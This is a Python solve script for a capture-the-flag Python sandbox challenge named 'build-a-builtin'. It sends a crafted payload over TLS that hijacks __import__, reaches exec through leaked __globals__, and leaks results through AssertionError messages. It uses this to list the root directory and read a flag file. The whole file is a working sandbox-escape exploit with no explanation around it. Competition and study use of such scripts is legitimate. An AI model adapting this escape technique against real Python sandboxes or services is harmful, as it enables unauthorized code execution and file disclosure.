#!/usr/bin/env python3
import argparse
import re
import socket
import ssl


DEFAULT_HOST = "build-a-builtin.opus4-7.b01le.rs"
DEFAULT_PORT = 8443


def build_stage2(expr: str) -> str:
    escaped_expr = expr.replace(".", "\\x2e")
    return (
        'set_builtin("__import__",lambda *a:set_builtin);'
        'from x import __globals__ as G;'
        f'G["exec"]("assert 0,{escaped_expr}",G,{{}})'
    )


def recv_until(sock: ssl.SSLSocket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def run_payload(host: str, port: int, payload: str) -> str:
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as raw_sock:
        with context.wrap_socket(raw_sock, server_hostname=host) as sock:
            recv_until(sock, b"code > ")
            sock.sendall(payload.encode() + b"\n")
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
    return response.decode(errors="replace")


def extract_assert_message(response: str) -> str:
    marker = "AssertionError: "
    if marker not in response:
        raise RuntimeError(f"unexpected response:\n{response}")
    return response.split(marker, 1)[1].strip()


def discover_flag_path(host: str, port: int) -> str:
    payload = build_stage2("__loader__.__class__.__init__.__globals__['_os'].listdir('/')")
    response = run_payload(host, port, payload)
    listing = extract_assert_message(response)
    match = re.search(r"flag-[a-f0-9]{32}\.txt", listing)
    if not match:
        raise RuntimeError(f"flag path not found in listing:\n{listing}")
    return "/" + match.group(0)


def read_flag(host: str, port: int, flag_path: str) -> str:
    payload = build_stage2(
        f"__loader__.__class__.__init__.__globals__['_io'].open({flag_path!r}).read()"
    )
    response = run_payload(host, port, payload)
    return extract_assert_message(response)


def main() -> None:
    parser = argparse.ArgumentParser(description="Solve build-a-builtin")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    args = parser.parse_args()

    flag_path = discover_flag_path(args.host, args.port)
    print(f"[+] flag path: {flag_path}")

    flag = read_flag(args.host, args.port, flag_path)
    print(f"[+] flag: {flag}")


if __name__ == "__main__":
    main()
